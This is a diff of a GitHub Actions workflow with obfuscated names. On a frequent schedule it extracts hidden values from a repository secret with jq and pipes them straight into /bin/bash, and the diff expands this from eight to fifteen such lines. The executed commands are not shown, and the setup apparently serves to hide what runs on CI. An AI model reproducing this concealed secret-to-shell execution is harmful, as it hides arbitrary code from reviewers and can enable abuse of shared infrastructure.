@@ -1,24 +1,32 @@
 name: chenyatou0987
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 4/6 * * *'
+    - cron: '56 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chenyatou0987
         env:
-          qfxfe51363: ${{ secrets.qfxfe51363 }}
+          oo14: ${{ secrets.oo14 }}
         run: |
-          echo $qfxfe51363 | jq -r .bx1300 | /bin/bash
-          echo $wqqv9807 | jq -r .nijgv325 | /bin/bash
-          echo $mus64839 | jq -r .by133 | /bin/bash
-          echo $m25 | jq -r .dk64 | /bin/bash
-          echo $mo37 | jq -r .mbt310 | /bin/bash
-          echo $xejq026 | jq -r .e89135 | /bin/bash
-          echo $g2 | jq -r .fc5 | /bin/bash
-          echo $ld0 | jq -r .e3691 | /bin/bash
+          echo $oo14 | jq -r .k1 | /bin/bash
+          echo $xlrdp19 | jq -r .h7987 | /bin/bash
+          echo $hhx0078 | jq -r .o760 | /bin/bash
+          echo $exbe233 | jq -r .afsr56217 | /bin/bash
+          echo $gzarf875 | jq -r .rslrm37 | /bin/bash
+          echo $ykxyy032 | jq -r .l17 | /bin/bash
+          echo $bntj8 | jq -r .dmkir74480 | /bin/bash
+          echo $tkrb5 | jq -r .ims36213 | /bin/bash
+          echo $zo330 | jq -r .u56 | /bin/bash
+          echo $ewt2771 | jq -r .pvb53 | /bin/bash
+          echo $l208 | jq -r .owyhd829 | /bin/bash
+          echo $uwfa6886 | jq -r .bu3578 | /bin/bash
+          echo $oorln4178 | jq -r .qw824 | /bin/bash
+          echo $glwo8 | jq -r .qqe3 | /bin/bash
+          echo $u3824 | jq -r .rmfq3 | /bin/bash
 
